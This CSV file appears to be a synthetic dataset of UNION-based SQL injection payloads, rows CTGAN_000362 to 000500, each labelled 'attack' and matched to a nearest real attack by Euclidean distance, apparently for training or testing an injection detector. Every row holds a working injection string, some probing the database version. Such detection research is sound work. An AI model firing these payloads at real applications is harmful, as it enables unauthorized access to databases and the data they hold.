id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000362,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000574,4.044727857753617
CTGAN_000363,attack,union," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000014,6.361046128031141
CTGAN_000364,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000542,3.4217935304857856
CTGAN_000365,attack,union,"-1166'   )    )    as icdz where 1042  =  1042 union all select 1042,1042,1042,1042,1042#",nearest_attack_euclidean,R000503,5.718697535023016
CTGAN_000366,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000554,5.045989498913588
CTGAN_000367,attack,union,"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",nearest_attack_euclidean,R000549,5.388135172772488
CTGAN_000368,attack,union," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",nearest_attack_euclidean,R000098,7.01052818046076
CTGAN_000369,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000574,6.683547303341321
CTGAN_000370,attack,union,"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",nearest_attack_euclidean,R000288,4.702186712618511
CTGAN_000371,attack,union," select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000172,7.654499075307632
CTGAN_000372,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000178,3.8132981867893045
CTGAN_000373,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000031,7.617740436556438
CTGAN_000374,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000510,3.0226007543932165
CTGAN_000375,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000144,7.505538214647771
CTGAN_000376,attack,union,"-8347%'  )   union all select 7643,7643,7643--",nearest_attack_euclidean,R000776,5.152738695301643
CTGAN_000377,attack,union,"-1513""  )   as swvd where 2958  =  2958 union all select 2958,2958,2958--",nearest_attack_euclidean,R000382,4.6763343740350765
CTGAN_000378,attack,union,"1'||  (  select 'tdcr' where 6792  =  6792 union all select null,null,null,null,null#",nearest_attack_euclidean,R000700,4.586301005476441
CTGAN_000379,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,5.483576962998264
CTGAN_000380,attack,union,"-6108'  )   union all select 2519,2519,2519,2519--",nearest_attack_euclidean,R000449,6.500473817888542
CTGAN_000381,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000691,4.502391344536054
CTGAN_000382,attack,union,"-4707' union all select 4414,4414,4414,4414,4414,4414#",nearest_attack_euclidean,R000586,5.359539889503223
CTGAN_000383,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000574,5.95962390114794
CTGAN_000384,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000766,4.729970563901181
CTGAN_000385,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000691,5.273113822846681
CTGAN_000386,attack,union,"-9574%'   )    )    union all select 5645,5645,5645,5645,5645,5645,5645--",nearest_attack_euclidean,R000402,6.613691042044301
CTGAN_000387,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,5.370361694240784
CTGAN_000388,attack,union,"1'+  (  select 'idmr' where 5029  =  5029 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000216,4.853140703722714
CTGAN_000389,attack,union,"-6360'  )   as yfrk where 3683  =  3683 union all select 3683,3683,3683,3683,3683,3683,3683,3683,3683#",nearest_attack_euclidean,R000443,7.173514102728379
CTGAN_000390,attack,union,"1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--",nearest_attack_euclidean,R000241,6.35482036057806
CTGAN_000391,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,5.122909225202937
CTGAN_000392,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000691,6.013438578297423
CTGAN_000393,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000186,5.748998856635333
CTGAN_000394,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000542,5.961909348163799
CTGAN_000395,attack,union,"1'+  (  select rwse where 9843  =  9843 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000236,5.252068626129196
CTGAN_000396,attack,union,"-5043%'   )    )     )   union all select 5860,5860,5860,5860,5860#",nearest_attack_euclidean,R000378,4.627570567876305
CTGAN_000397,attack,union,"-9922'   )    )    union all select 2193,2193,2193--",nearest_attack_euclidean,R000397,5.067796694805437
CTGAN_000398,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000028,6.352424770051606
CTGAN_000399,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,6.098625592226291
CTGAN_000400,attack,union,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",nearest_attack_euclidean,R000319,6.751877417135365
CTGAN_000401,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000510,5.975304731965978
CTGAN_000402,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,6.938539493811307
CTGAN_000403,attack,union,"-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#",nearest_attack_euclidean,R000697,6.044122207860411
CTGAN_000404,attack,union,"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",nearest_attack_euclidean,R000711,6.122459862129907
CTGAN_000405,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000286,6.719297948297847
CTGAN_000406,attack,union,"-3562""  )   as eghl where 7094  =  7094 union all select 7094,7094,7094,7094#",nearest_attack_euclidean,R000311,4.573672040229716
CTGAN_000407,attack,union," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000023,6.640806597911877
CTGAN_000408,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000186,5.4359141099512716
CTGAN_000409,attack,union,"-7715'  )   union all select 4830,4830,4830,4830,4830,4830,4830,4830--",nearest_attack_euclidean,R000362,4.424691916234938
CTGAN_000410,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,4.167134763875434
CTGAN_000411,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000199,5.527961361294074
CTGAN_000412,attack,union,"-5372""  )   as wlqm where 2432  =  2432 union all select 2432,2432,2432,2432,2432,2432#",nearest_attack_euclidean,R000324,6.430498525284105
CTGAN_000413,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000186,5.396983407772508
CTGAN_000414,attack,union,"1'+  (  select kpso where 1226  =  1226 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000350,6.438867705654791
CTGAN_000415,attack,union,"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",nearest_attack_euclidean,R000711,5.911472724790747
CTGAN_000416,attack,union,"-6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271#",nearest_attack_euclidean,R000664,5.7240300945816935
CTGAN_000417,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000564,7.137754621308301
CTGAN_000418,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,6.618371182174379
CTGAN_000419,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000081,6.2206247785829225
CTGAN_000420,attack,union,"-2889   )    )    as iqzv where 1786  =  1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--",nearest_attack_euclidean,R000440,4.899645927532294
CTGAN_000421,attack,union,"-4605""  )   union all select 8542,8542,8542,8542,8542,8542,8542,8542--",nearest_attack_euclidean,R000179,6.5776019537493475
CTGAN_000422,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000525,4.956124350155923
CTGAN_000423,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000674,4.648501848664316
CTGAN_000424,attack,union,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",nearest_attack_euclidean,R000746,4.311337567055051
CTGAN_000425,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,5.498372793542225
CTGAN_000426,attack,union,"1   )    )    as fynx where 9636  =  9636 union all select null,null,null,null,null--",nearest_attack_euclidean,R000357,6.099598500950606
CTGAN_000427,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000157,6.254041336975653
CTGAN_000428,attack,union,"-7941%'  )   union all select 6965,6965,6965,6965--",nearest_attack_euclidean,R000506,6.6003124976998295
CTGAN_000429,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000674,5.078740291274874
CTGAN_000430,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000510,6.391387634366243
CTGAN_000431,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,5.335769459820306
CTGAN_000432,attack,union,"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000458,6.381798963081232
CTGAN_000433,attack,union,"-3179'+  (  select 'tzzz' where 3191  =  3191 union all select 3191,3191,3191,3191,3191#",nearest_attack_euclidean,R000265,4.512746822334012
CTGAN_000434,attack,union,"-9039'  )   union all select 8058,8058,8058,8058,8058--",nearest_attack_euclidean,R000227,5.346764671467779
CTGAN_000435,attack,union,"-2434'   )    )     )   union all select 5509,5509,5509,5509,5509,5509,5509--",nearest_attack_euclidean,R000451,5.864809395917505
CTGAN_000436,attack,union,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",nearest_attack_euclidean,R000282,4.6967649063489025
CTGAN_000437,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000633,5.6558746067978545
CTGAN_000438,attack,union,"-1413""  )   union all select 6651,6651,6651--",nearest_attack_euclidean,R000717,5.860155313647341
CTGAN_000439,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000674,4.870832233244575
CTGAN_000440,attack,union,"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",nearest_attack_euclidean,R000423,8.267453228164761
CTGAN_000441,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000574,4.581194877560864
CTGAN_000442,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000261,5.275949034230166
CTGAN_000443,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000691,6.027356103911867
CTGAN_000444,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000157,5.607318750616538
CTGAN_000445,attack,union,"-4679 where 9634  =  9634 union all select 9634,9634,9634,9634,9634,9634,9634--",nearest_attack_euclidean,R000728,5.92543101536002
CTGAN_000446,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,3.301213060063666
CTGAN_000447,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000180,4.363323437269037
CTGAN_000448,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000016,6.792009917954497
CTGAN_000449,attack,union,"1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--",nearest_attack_euclidean,R000517,5.250284005620981
CTGAN_000450,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000766,5.574148382032418
CTGAN_000451,attack,union," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",nearest_attack_euclidean,R000006,6.7937180568294995
CTGAN_000452,attack,union,"-1333""   )    )    union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--",nearest_attack_euclidean,R000681,6.11726496227131
CTGAN_000453,attack,union,"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",nearest_attack_euclidean,R000198,3.9299473172832187
CTGAN_000454,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000206,6.344446217671206
CTGAN_000455,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000674,7.348369858175881
CTGAN_000456,attack,union,"1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--",nearest_attack_euclidean,R000517,6.00871080337967
CTGAN_000457,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000178,4.8072128497595985
CTGAN_000458,attack,union,"-7715'  )   union all select 4830,4830,4830,4830,4830,4830,4830,4830--",nearest_attack_euclidean,R000362,4.864538798464942
CTGAN_000459,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000542,6.453312055144446
CTGAN_000460,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000542,6.551193056131574
CTGAN_000461,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000349,6.097838228261259
CTGAN_000462,attack,union,"-8432  )   union all select 8169,8169,8169,8169,8169,8169,8169,8169,8169,8169--",nearest_attack_euclidean,R000318,4.615386274070774
CTGAN_000463,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,4.671531426022961
CTGAN_000464,attack,union,"-7409""   )    )    union all select 3145,3145,3145--",nearest_attack_euclidean,R000284,4.485446778042282
CTGAN_000465,attack,union,"-8833'   )    )    union all select 3227,3227,3227,3227,3227--",nearest_attack_euclidean,R000426,6.339314500491893
CTGAN_000466,attack,union,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",nearest_attack_euclidean,R000746,6.198387849874353
CTGAN_000467,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000303,6.7156565082477675
CTGAN_000468,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,5.404879243620984
CTGAN_000469,attack,union,"-8007' where 9649  =  9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--",nearest_attack_euclidean,R000771,6.287488920974554
CTGAN_000470,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,5.195970736760206
CTGAN_000471,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000425,5.5434859978688635
CTGAN_000472,attack,union,"-6597'+  (  select aewz where 4036  =  4036 union all select 4036,4036,4036,4036,4036,4036,4036--",nearest_attack_euclidean,R000229,5.002267036676334
CTGAN_000473,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000421,5.169278789726094
CTGAN_000474,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000765,5.509778506434627
CTGAN_000475,attack,union,"-8609' union all select 9384,9384,9384,9384--",nearest_attack_euclidean,R000621,5.338039273971495
CTGAN_000476,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,5.149017012163795
CTGAN_000477,attack,union,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",nearest_attack_euclidean,R000746,4.770095551840601
CTGAN_000478,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000210,5.352134803072489
CTGAN_000479,attack,union,"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",nearest_attack_euclidean,R000711,5.901923200716761
CTGAN_000480,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000219,5.141647039229252
CTGAN_000481,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,3.7020203266594334
CTGAN_000482,attack,union,"1'+  (  select kpso where 1226  =  1226 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000350,6.7921688942531775
CTGAN_000483,attack,union,"1'+  (  select 'fxhh' where 2571  =  2571 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000480,4.769770122828544
CTGAN_000484,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,5.088909170989727
CTGAN_000485,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000219,6.429359604080644
CTGAN_000486,attack,union," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",nearest_attack_euclidean,R000006,7.520830697314882
CTGAN_000487,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000199,4.5626695790063705
CTGAN_000488,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000508,5.479522839676626
CTGAN_000489,attack,union,"-9039'  )   union all select 8058,8058,8058,8058,8058--",nearest_attack_euclidean,R000227,5.7949429554276115
CTGAN_000490,attack,union,"-5360' where 8178  =  8178 union all select 8178,8178,8178--",nearest_attack_euclidean,R000616,6.295898000805954
CTGAN_000491,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,5.603876310089104
CTGAN_000492,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000157,6.22972330187005
CTGAN_000493,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,4.663419593460325
CTGAN_000494,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000210,5.802218533875431
CTGAN_000495,attack,union,"-8612'+  (  select 'iqla' where 5035  =  5035 union all select 5035,5035,5035,5035,5035,5035,5035#",nearest_attack_euclidean,R000775,4.889213917302511
CTGAN_000496,attack,union,"-7715'  )   union all select 4830,4830,4830,4830,4830,4830,4830,4830--",nearest_attack_euclidean,R000362,5.771507346926035
CTGAN_000497,attack,union,"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",nearest_attack_euclidean,R000423,6.676439530518858
CTGAN_000498,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000674,5.196380163681191
CTGAN_000499,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,5.69504055901553
CTGAN_000500,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000144,7.019402205439835
